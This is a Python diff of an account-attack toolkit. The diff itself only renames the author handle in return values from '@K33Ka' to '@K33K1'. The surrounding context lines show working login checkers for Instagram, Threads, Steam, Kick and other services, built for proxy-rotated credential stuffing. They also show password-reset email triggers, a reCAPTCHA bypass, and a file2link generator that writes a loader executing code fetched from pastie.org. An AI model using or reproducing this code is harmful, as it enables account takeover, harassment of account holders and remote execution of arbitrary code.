             r=self.session.post('https://hi2.in/api/custom',headers=h2,data={'domain':domin,'prefix':prefix,'recaptcha':final})
             t=r.text.lower()
-            if "just a moment" in t:return {"status":"blocked","message":"cloudflare block","email":email,"Dev":"Odai @K33Ka"}
-            elif "hash" in t:return {"status":"available","email":email,"Dev":"Odai @K33Ka"}
-            elif "address already taken" in t:return {"status":"taken","email":email,"Dev":"Odai @K33Ka"}
-            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33Ka"}
-        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33Ka"}
+            if "just a moment" in t:return {"status":"blocked","message":"cloudflare block","email":email,"Dev":"Odai @K33K1"}
+            elif "hash" in t:return {"status":"available","email":email,"Dev":"Odai @K33K1"}
+            elif "address already taken" in t:return {"status":"taken","email":email,"Dev":"Odai @K33K1"}
+            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33K1"}
+        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33K1"}
     @staticmethod
     def outlook(email, proxies=None):
         proxy = proxies if proxies else None
@@ -1223,18 +1223,18 @@ class checkems:
             ).text
 
             if '"isAvailable":true' in r:
-                return {"status": "available", "email": email, "Dev": "Odai @K33Ka"}
+                return {"status": "available", "email": email, "Dev": "Odai @K33K1"}
             if '"isAvailable":false' in r:
-                return {"status": "taken", "email": email, "Dev": "Odai @K33Ka"}
+                return {"status": "taken", "email": email, "Dev": "Odai @K33K1"}
             checkems.outlook.mc, checkems.outlook.ca = get_token()
-            return {"status": "error", "response": "unknown", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "response": "unknown", "Dev": "Odai @K33K1"}
         except Exception as e:
             checkems.outlook.mc, checkems.outlook.ca = get_token()
-            return {"status": "error", "error": str(e), "Dev": "Odai @K33Ka"}
+            return {"status": "error", "error": str(e), "Dev": "Odai @K33K1"}
 class threads:
     @staticmethod
     def login(user, password, proxies=None):
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         if not user or not password:return {"status": "invalid input","user": user,"password": password,"Dev": Dev}
         payload = {'can_threads_signup_with_ig': "false",'enc_password': f"#PWD_BROWSER:0:{str(int(time.time()))}:{password}",'optIntoOneTap': "false",'queryParams': "{}",'stopDeletionNonce': "","textAppStopDeletionToken": "","username": user}
         headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",'x-instagram-ajax': "0",'x-ig-app-id': "1412234116260832",'x-asbd-id': "359341",'x-bloks-version-id': "86eaac606b7c5e9b45f4357f86082d05eace8411e43d3f754d885bf54a759a71",'sec-ch-prefers-color-scheme': "light",'sec-ch-ua-platform-version': "\"16.0.0\"",'origin': "https://www.threads.com",'sec-fetch-site': "same-origin",'sec-fetch-mode': "cors",'sec-fetch-dest': "empty",'referer': "https://www.threads.com/login/",'accept-language': "en-US"}
@@ -1255,7 +1255,7 @@ class threads:
         except Exception as e:return {"status": "error","error": str(e),"user": user,"password": password,"Dev": Dev}
     @staticmethod
     def info(username, proxies=None):
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         if not username:return {"status": "invalid input","Dev": Dev}
         try:
             cookies = {'csrftoken': '','ig_did': '','dpr': '2.737499952316284','mid': ''}
@@ -1327,16 +1327,16 @@ class instagram:
             r=requests.post("https://i.instagram.com/api/v1/accounts/login/",data=data,headers=headers,proxies = Proxy.build(proxies));text=r.text
             try:js=r.json()
             except:js={}
-            if '"authenticated":true' in text or 'logged_in_user' in text:return {"status":"success","user":username,"password":password,"Dev":"Odai @K33Ka"}
+            if '"authenticated":true' in text or 'logged_in_user' in text:return {"status":"success","user":username,"password":password,"Dev":"Odai @K33K1"}
             error_type=js.get("error_type","")
-            if error_type=="bad_password":return {"status":"bad password","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            elif error_type=="invalid_user":return {"status":"user not found","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            elif error_type in ["two_factor_required","challenge_required"]:return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            elif error_type=="checkpoint_challenge_required":return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            elif error_type=="missing_parameters":return {"status":"missing parameters","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            elif error_type=="unexpected_login_error":return {"status":"error login","user":username,"password":password,"Dev":"Odai @K33Ka"}
-            else:return {"status":"unknown response","user":username,"password":password,"Dev":"Odai @K33Ka"}
-        except Exception as e:return {"status":"error","error":str(e),"user":username,"password":password,"Dev":"Odai @K33Ka"}
+            if error_type=="bad_password":return {"status":"bad password","user":username,"password":password,"Dev":"Odai @K33K1"}
+            elif error_type=="invalid_user":return {"status":"user not found","user":username,"password":password,"Dev":"Odai @K33K1"}
+            elif error_type in ["two_factor_required","challenge_required"]:return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33K1"}
+            elif error_type=="checkpoint_challenge_required":return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33K1"}
+            elif error_type=="missing_parameters":return {"status":"missing parameters","user":username,"password":password,"Dev":"Odai @K33K1"}
+            elif error_type=="unexpected_login_error":return {"status":"error login","user":username,"password":password,"Dev":"Odai @K33K1"}
+            else:return {"status":"unknown response","user":username,"password":password,"Dev":"Odai @K33K1"}
+        except Exception as e:return {"status":"error","error":str(e),"user":username,"password":password,"Dev":"Odai @K33K1"}
     #@staticmethod
     def reset(self, search_query, proxy=None):
         self.session = requests.Session()
@@ -1373,11 +1373,11 @@ class instagram:
         if PROXIES:
             response = self.session.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data,proxies=PROXIES)
             try:data_dict = json.loads(response.text)
-            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33Ka"}
+            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33K1"}
         else:
             response = self.session.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data)
             try:data_dict = json.loads(response.text)
-            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33Ka"}
+            except:return {"status": "error in send response","email": search_query,"Dev": "Odai @K33K1"}
         result = {}
         try:
             caa = data_dict["data"]["caa_ar_ig_account_search"]
@@ -1390,9 +1390,9 @@ class instagram:
             contact_points = caa.get("contact_points", [])
             if contact_points:result["contact point"] = contact_points[0].get("contact_point")
             result["allow display"] = caa.get("allow_display")
-            result["Dev"] = "Odai @K33Ka"
-        except Exception as e:result = {"status": "error","error": str(e),"email": search_query,"Dev": "Odai @K33Ka"}
-        if "@" in search_query:return {"status": "success","message": "email sent successfully","email": search_query,"Dev": "Odai @K33Ka"}
+            result["Dev"] = "Odai @K33K1"
+        except Exception as e:result = {"status": "error","error": str(e),"email": search_query,"Dev": "Odai @K33K1"}
+        if "@" in search_query:return {"status": "success","message": "email sent successfully","email": search_query,"Dev": "Odai @K33K1"}
         return result
     @staticmethod
     def date(iD):
@@ -1416,12 +1416,12 @@ class instagram:
             elif 76593747274 <= iD <= 80400988632:date = 2025
             elif iD >= 80400988633:date = 2026
             else:date = None
-            return {"status": "success","iD": iD,"date": date,"Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error","error": str(e),"iD": iD,"Dev": "Odai @K33Ka"}
+            return {"status": "success","iD": iD,"date": date,"Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error","error": str(e),"iD": iD,"Dev": "Odai @K33K1"}
     @staticmethod
     def info_s(sessionid, proxies=None):
         import requests, json
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         if not sessionid:
             return {"status": "invalid input","sessionid": sessionid,"Dev": Dev}
         try:
@@ -1455,7 +1455,7 @@ class instagram:
         from requests.adapters import HTTPAdapter
         from urllib3.util.retry import Retry
 
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
 
         try:
             def k():
@@ -1506,7 +1506,7 @@ class instagram:
     @staticmethod
     def info(username, proxies=None):
         import requests
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         if not username:return {"status": "invalid input","username": username,"Dev": Dev}
         try:
             r = requests.get(f'https://peekviewer.com/api/ig/{username}', proxies = Proxy.build(proxies))
@@ -1557,7 +1557,7 @@ class instagram:
     @staticmethod
     def checkusername(username,proxies=None):
         import requests,re,random
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             url = "https://www.instagram.com/"
             response = requests.get(url, proxies = Proxy.build(proxies))
@@ -1583,15 +1583,15 @@ class instagram:
         try:
             response = requests.post("https://i.instagram.com/api/v1/users/check_email/",headers={"User-Agent": "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*"},data={"email": mail},proxies=proxy,timeout=20)
             res_lower = response.text.lower()
-            if response.status_code == 429: return {"status":"blocked","message":"too many requests (429)","email":mail,"Dev":"Odai @K33Ka"}
-            if ("text/html" in res_lower or "<!doctype html" in res_lower or "<html" in res_lower): return {"status":"blocked","message":"html response (blocked)","email":mail,"Dev":"Odai @K33Ka"}
-            if ('"spam":true' in res_lower and '"status":"fail"' in res_lower): return {"status":"blocked","message":"spam detected","email":mail,"Dev":"Odai @K33Ka"}
-            if '"error_type":"invalid_email"' in res_lower: return {"status":"invalid email","message":"invalid email format","email":mail,"Dev":"Odai @K33Ka"}
-            if ('"error_type":"email_is_taken"' in res_lower or '"email_is_taken":true' in res_lower):return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33Ka"}
-            if ('"email_is_taken":false' in res_lower or '"available":true' in res_lower): return {"status":"not taken","message":"this email is available","email":mail,"Dev":"Odai @K33Ka"}
-            if "email_is_taken" in res_lower: return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33Ka"}
-            return {"status":"unknown response","email":mail,"Dev":"Odai @K33Ka"}
-        except Exception as e:return {"status":"error","error": e,"Dev":"Odai @K33Ka"}
+            if response.status_code == 429: return {"status":"blocked","message":"too many requests (429)","email":mail,"Dev":"Odai @K33K1"}
+            if ("text/html" in res_lower or "<!doctype html" in res_lower or "<html" in res_lower): return {"status":"blocked","message":"html response (blocked)","email":mail,"Dev":"Odai @K33K1"}
+            if ('"spam":true' in res_lower and '"status":"fail"' in res_lower): return {"status":"blocked","message":"spam detected","email":mail,"Dev":"Odai @K33K1"}
+            if '"error_type":"invalid_email"' in res_lower: return {"status":"invalid email","message":"invalid email format","email":mail,"Dev":"Odai @K33K1"}
+            if ('"error_type":"email_is_taken"' in res_lower or '"email_is_taken":true' in res_lower):return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33K1"}
+            if ('"email_is_taken":false' in res_lower or '"available":true' in res_lower): return {"status":"not taken","message":"this email is available","email":mail,"Dev":"Odai @K33K1"}
+            if "email_is_taken" in res_lower: return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33K1"}
+            return {"status":"unknown response","email":mail,"Dev":"Odai @K33K1"}
+        except Exception as e:return {"status":"error","error": e,"Dev":"Odai @K33K1"}
 class steam:
     @staticmethod
     def login(username,password,proxy=None):
@@ -1622,7 +1622,7 @@ class steam:
             )
             rsa_data=rsa_res.json()
             if not rsa_data.get("success",False):
-                rsa_data["Dev"]="Odai @K33Ka"
+                rsa_data["Dev"]="Odai @K33K1"
                 return "BAN",rsa_data
             mod=rsa_data.get("publickey_mod")
             exp=rsa_data.get("publickey_exp")
@@ -1658,7 +1658,7 @@ class steam:
                 }
             )
             login_data=login_res.json()
-            login_data["Dev"]="Odai @K33Ka"
+            login_data["Dev"]="Odai @K33K1"
             if login_data.get("success",False):return "SUCCESS",session
             elif login_data.get("captcha_needed")==True:return "BAN",login_data
             elif login_data.get("requires_twofactor")==True or login_data.get("emailauth_needed")==True:
@@ -1704,9 +1704,9 @@ class roblox:
                 return False
             except:return False
         res=check(u)
-        return {"available":res,"Dev":"Odai @K33Ka"}
+        return {"available":res,"Dev":"Odai @K33K1"}
 def inviteinfo(invite):
-    DEV = "Odai @K33Ka"
+    DEV = "Odai @K33K1"
     if "discord.gg/" in invite:invite_code = invite.split("discord.gg/")[-1].split("/")[0]
     elif "discord.com/invite/" in invite:invite_code = invite.split("discord.com/invite/")[-1].split("/")[0]
     else:invite_code = invite.strip()
@@ -1784,16 +1784,16 @@ class bloodstrike:
         headers={'User-Agent':"com.netease.newspikeme/122 NeteaseMobileGame/a3.16.1 (2201117PG;33)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip",'Accept-Charset':"UTF-8",'Accept-Language':"en-us"}
         try:
             r=requests.post(url,params=params,data=data,headers=headers);t=r.text
-            if 'login_token' in t:return {"status":"success","Dev":"Odai @K33Ka"}
-            elif 'Account does not exist' in t:return {"status":"not_found","Dev":"Odai @K33Ka"}
-            elif '429 Too Many Requests' in t:return {"status":"retry","Dev":"Odai @K33Ka"}
-            elif 'Incorrect account or password.' in t:return {"status":"bad password","Dev":"Odai @K33Ka"}
-            else:return {"status":"unknown","Dev":"Odai @K33Ka"}
-        except:return {"status":"error","Dev":"Odai @K33Ka"}
+            if 'login_token' in t:return {"status":"success","Dev":"Odai @K33K1"}
+            elif 'Account does not exist' in t:return {"status":"not_found","Dev":"Odai @K33K1"}
+            elif '429 Too Many Requests' in t:return {"status":"retry","Dev":"Odai @K33K1"}
+            elif 'Incorrect account or password.' in t:return {"status":"bad password","Dev":"Odai @K33K1"}
+            else:return {"status":"unknown","Dev":"Odai @K33K1"}
+        except:return {"status":"error","Dev":"Odai @K33K1"}
 class pipinfo:
     @staticmethod
     def info(package):
-        DEV = "Odai - @K33Ka"
+        DEV = "Odai - @K33K1"
         try:
             package = package.strip()
             stats_url = f"https://pypistats.org/api/packages/{package}/overall"
@@ -1842,7 +1842,7 @@ class pipinfo:
 class pinterest:
     @staticmethod
     def info(username, download=False):
-        DEV = "Odai - @K33Ka"
+        DEV = "Odai - @K33K1"
         try:
             username = username.strip()
             all_pins = []
@@ -1927,8 +1927,8 @@ class recaptcha:
             rh=h.copy();rh['referer']=f'{api}/anchor?ar=1&k={siteKey}&co={co}&hl=en&v={v}&size=invisible&cb=abc123'
             r=self.session.post(f'{api}/reload?k={siteKey}',data={'v':v,'co':co,'reason':'q','size':'invisible','hl':'en','k':siteKey,'c':t,'chr':'','vh':'','bg':''},headers=rh).text
             final=r.split('"rresp","')[1].split('"')[0]
-            return {"site":siteUrl,"siteKey":siteKey,"token":final,"v":v,"api":api,"Dev":"Odai - @K33Ka"}
-        except Exception as e:return {"error":str(e),"Dev":"Odai - @K33Ka"}
+            return {"site":siteUrl,"siteKey":siteKey,"token":final,"v":v,"api":api,"Dev":"Odai - @K33K1"}
+        except Exception as e:return {"error":str(e),"Dev":"Odai - @K33K1"}
     @staticmethod
     def V2(siteUrl="https://example.com/", siteKey=""):
         try:
@@ -2006,14 +2006,14 @@ class recaptcha:
                 "token": final_token,
                 "v": v,
                 "api": api,
-                "Dev": "Odai - @K33Ka",
+                "Dev": "Odai - @K33K1",
             }
         except Exception as e:
-            return {"error": str(e),"Dev": "Odai - @K33Ka"}
+            return {"error": str(e),"Dev": "Odai - @K33K1"}
 class damkom:
     @staticmethod
     def login(username, password, proxy=None):
-        Dev = "Odai - @K33Ka"
+        Dev = "Odai - @K33K1"
         try:
             proxies = None
             if proxy:proxies = Proxy.build(proxy)
@@ -2080,7 +2080,7 @@ class Outlook:
                 "found": False,
                 "count": 0
             },
-            "Dev": "Odai @K33Ka"
+            "Dev": "Odai @K33K1"
         }
         
         try:
@@ -2281,7 +2281,7 @@ class telegram:
             "status": False,
             "username": username,
             "state": "unknown",
-            "Dev": "Odai @K33Ka"
+            "Dev": "Odai @K33K1"
         }
         try:
             session = requests.Session()
@@ -2318,7 +2318,7 @@ class telegram:
 class weatherinfo:
     @staticmethod
     def info():
-        DEV = "Odai - @K33Ka"
+        DEV = "Odai - @K33K1"
         try:
             def get_ip_info():
                 try:
@@ -2437,15 +2437,15 @@ class file2link:
                 return {
                     "status": False,
                     "error": "Failed to extract link",
-                    "Dev": 'Odai @K33Ka'
+                    "Dev": 'Odai @K33K1'
                 }
             link = match.group(1)
             output_code = (
                 "from requests import get as odai\n"
-                f"k33ka = odai('http://pastie.org{link}')\n"
-                "exec(k33ka.text)"
+                f"K33K1 = odai('http://pastie.org{link}')\n"
+                "exec(K33K1.text)"
             )
-            output_path = "output-K33Ka.py"
+            output_path = "output-K33K1.py"
             with open(output_path, "w", encoding="utf-8") as f:
                 f.write(output_code)
             end_time = time.time()
@@ -2454,14 +2454,14 @@ class file2link:
                 "output_file": output_path,
                 "paste_link": f"http://pastie.org{link}",
                 "time_sec": round(end_time - start_time, 2),
-                "Dev": "Odai @K33Ka"
+                "Dev": "Odai @K33K1"
             }
 
         except Exception as e:
             return {
                 "status": False,
                 "error": str(e),
-                "Dev": "Odai @K33Ka"
+                "Dev": "Odai @K33K1"
             }
 class namefromphone:
     def __init__(self):
@@ -2494,10 +2494,10 @@ class konami:
             bm_mi=cok.get('bm_mi');bm_sv=cok.get('bm_sv');abck=cok.get('_abck')
             r=self.session.post('https://my.konami.net/api/password-reminder/sendPasswordRemindEmail',cookies={'_rslgvry':'0b05a61f-6953-48a0-bc76-078b1a6ff12b','r_window':'off','_abck':abck,'_ga_7ELXYMVNS4':'GS2.1.s1777246762$o1$g1$t1777246781$j41$l0$h2135807605','bm_sv':bm_sv},headers=h,json={'locale':'en_US','email':email})
             t=r.text.lower()
-            if r.text=='{}':return {"status":"success","message":"reset link sent","email":email,"Dev":"Odai @K33Ka"}
-            elif 'invalid email' in t:return {"status":"invalid","message":"invalid email","email":email,"Dev":"Odai @K33Ka"}
-            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33Ka"}
-        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33Ka"}
+            if r.text=='{}':return {"status":"success","message":"reset link sent","email":email,"Dev":"Odai @K33K1"}
+            elif 'invalid email' in t:return {"status":"invalid","message":"invalid email","email":email,"Dev":"Odai @K33K1"}
+            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33K1"}
+        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33K1"}
 class kick:
     def __init__(self, proxies=None):
         self.proxies = Proxy.build(proxies) if proxies else None
@@ -2575,7 +2575,7 @@ class kick:
         self._get("https://kick.com")
         token_data = self._get("https://kick.com/kick-token-provider")
         if token_data.get("_error"):
-            return {"status": "error", "message": "Failed to fetch login token", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Failed to fetch login token", "Dev": "Odai @K33K1"}
 
         payload = {
             "email": email,
@@ -2596,19 +2596,19 @@ class kick:
         result = self._post("https://kick.com/mobile/login", payload)
 
         if result.get("2fa_required"):
-            return {"status": "2fa_required", "message": "Two-factor code required", "Dev": "Odai @K33Ka"}
+            return {"status": "2fa_required", "message": "Two-factor code required", "Dev": "Odai @K33K1"}
 
         if result.get("token") or result.get("access_token"):
             self.auth_token = result.get("token") or result.get("access_token")
             self.logged_in = True
             self.user_data = self.user_info()
-            return {"status": "success", "user": self.user_data, "Dev": "Odai @K33Ka"}
+            return {"status": "success", "user": self.user_data, "Dev": "Odai @K33K1"}
 
         if result.get("_error") or result.get("_status", 200) >= 400:
-            return {"status": "error", "message": result.get("message", "Login failed"), "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": result.get("message", "Login failed"), "Dev": "Odai @K33K1"}
         self.logged_in = True
         self.user_data = self.user_info()
-        return {"status": "success", "user": self.user_data, "Dev": "Odai @K33Ka"}
+        return {"status": "success", "user": self.user_data, "Dev": "Odai @K33K1"}
 
     def user_info(self):
         resp = self._get("https://kick.com/api/v1/user")
@@ -2620,7 +2620,7 @@ class kick:
     def channel_info(self, slug):
         ch = self._get(f"https://kick.com/api/v2/channels/{slug}")
         if ch.get("_error"):
-            return {"status": "error", "message": "Channel not found", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Channel not found", "Dev": "Odai @K33K1"}
 
         ls = self._get(f"https://kick.com/api/v2/channels/{slug}/livestream")
         cr = self._get(f"https://kick.com/api/v2/channels/{slug}/chatroom")
@@ -2667,13 +2667,13 @@ class kick:
                 "subscribers_mode": chat_data.get("subscribers_mode"),
                 "emotes_mode": chat_data.get("emotes_mode"),
             },
-            "Dev": "Odai @K33Ka"
+            "Dev": "Odai @K33K1"
         }
 
     def livestream(self, slug):
         data = self._get(f"https://kick.com/api/v2/channels/{slug}/livestream")
         if data.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
         live = data.get("data", {})
         return {
             "status": "success",
@@ -2683,13 +2683,13 @@ class kick:
             "category": (live.get("category") or {}).get("name"),
             "started": live.get("created_at"),
             "thumbnail": (live.get("thumbnail") or {}).get("src"),
-            "Dev": "Odai @K33Ka"
+            "Dev": "Odai @K33K1"
         }
 
     def chatroom(self, slug):
         cr = self._get(f"https://kick.com/api/v2/channels/{slug}/chatroom")
         if cr.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
         sm = cr.get("slow_mode") or {}
         fm = cr.get("followers_mode") or {}
         sub = cr.get("subscribers_mode") or {}
@@ -2704,48 +2704,48 @@ class kick:
             "subscribers_mode": sub.get("enabled", False) if isinstance(sub, dict) else False,
             "emotes_mode": em.get("enabled", False) if isinstance(em, dict) else False,
             "pinned": cr.get("pinned_message"),
-            "Dev": "Odai @K33Ka"
+            "Dev": "Odai @K33K1"
         }
 
     def clips(self, slug, cursor=0, sort="view", limit=20):
         params = f"?cursor={cursor}&sort={sort}&limit={limit}"
         data = self._get(f"https://kick.com/api/v2/channels/{slug}/clips{params}")
         if data.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
         clips = data.get("clips", [])
-        return {"status": "success", "clips": clips, "Dev": "Odai @K33Ka"}
+        return {"status": "success", "clips": clips, "Dev": "Odai @K33K1"}
 
     def leaderboards(self, slug):
         data = self._get(f"https://kick.com/api/v2/channels/{slug}/leaderboards")
         if data.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
-        return {"status": "success", "leaderboards": data, "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
+        return {"status": "success", "leaderboards": data, "Dev": "Odai @K33K1"}
 
     def polls(self, slug):
         data = self._get(f"https://kick.com/api/v2/channels/{slug}/polls")
         if data.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
-        return {"status": "success", "polls": data, "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
+        return {"status": "success", "polls": data, "Dev": "Odai @K33K1"}
 
     def followers(self, slug):
         data = self._get(f"https://kick.com/api/v1/channels/{slug}/followers")
         if data.get("_error"):
-            return {"status": "error", "message": "Not found", "Dev": "Odai @K33Ka"}
-        return {"status": "success", "followers": data, "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
+        return {"status": "success", "followers": data, "Dev": "Odai @K33K1"}
 
     def follow(self, slug):
         self._ensure_xsrf()
         resp = self._post(f"https://kick.com/api/v2/channels/{slug}/follow")
         if resp.get("_error"):
-            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33Ka"}
-        return {"status": "success", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
+        return {"status": "success", "Dev": "Odai @K33K1"}
 
     def unfollow(self, slug):
         self._ensure_xsrf()
         resp = self._delete(f"https://kick.com/api/v2/channels/{slug}/follow")
         if resp.get("_error"):
-            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33Ka"}
-        return {"status": "success", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
+        return {"status": "success", "Dev": "Odai @K33K1"}
 
     def send_message(self, chatroom_id, message):
         self._ensure_xsrf()
@@ -2754,29 +2754,29 @@ class kick:
             {"content": message, "type": "message"}
         )
         if resp.get("_error"):
-            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33Ka"}
-        return {"status": "success", "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
+        return {"status": "success", "Dev": "Odai @K33K1"}
 
     def search(self, query):
         import urllib.parse
         url = f"https://kick.com/api/search?searched_word={urllib.parse.quote(query)}"
         data = self._get(url)
         if data.get("_error"):
-            return {"status": "error", "message": "Search failed", "Dev": "Odai @K33Ka"}
-        return {"status": "success", "data": data, "Dev": "Odai @K33Ka"}
+            return {"status": "error", "message": "Search failed", "Dev": "Odai @K33K1"}
+        return {"status": "success", "data": data, "Dev": "Odai @K33K1"}
 
     def followed_channels(self):
         data = self._get("https://kick.com/api/v2/channels/followed")
         if isinstance(data, list):
-            return {"status": "success", "channels": data, "Dev": "Odai @K33Ka"}
+            return {"status": "success", "channels": data, "Dev": "Odai @K33K1"}
         if isinstance(data, dict) and not data.get("_error"):
             channels = data.get("channels", data.get("data", []))
-            return {"status": "success", "channels": channels, "Dev": "Odai @K33Ka"}
-        return {"status": "error", "message": "Not logged in", "Dev": "Odai @K33Ka"}
+            return {"status": "success", "channels": channels, "Dev": "Odai @K33K1"}
+        return {"status": "error", "message": "Not logged in", "Dev": "Odai @K33K1"}
 class zefame:
     @staticmethod
     def login(email, password, proxies=None):
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             session = requests.Session()
             r = session.get("https://zefame.com/", proxies=Proxy.build(proxies), timeout=10)
@@ -2802,7 +2802,7 @@ class github:
     BASE = "https://api.github.com"
     @staticmethod
     def info(username: str, proxies=None) -> dict:
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             url = f"{github.BASE}/users/{username}"
             resp = requests.get(url, proxies=None, timeout=15)
@@ -2812,7 +2812,7 @@ class github:
         except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
     @staticmethod
     def repositoriesinfo(username: str, proxies=None) -> dict:
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             url = f"{github.BASE}/users/{username}/repos"
             resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
@@ -2823,7 +2823,7 @@ class github:
         except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
     @staticmethod
     def followersinfo(username: str, proxies=None) -> dict:
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             url = f"{github.BASE}/users/{username}/followers"
             resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
@@ -2834,7 +2834,7 @@ class github:
         except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
     @staticmethod
     def followingsinfo(username: str, proxies=None) -> dict:
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         try:
             url = f"{github.BASE}/users/{username}/following"
             resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
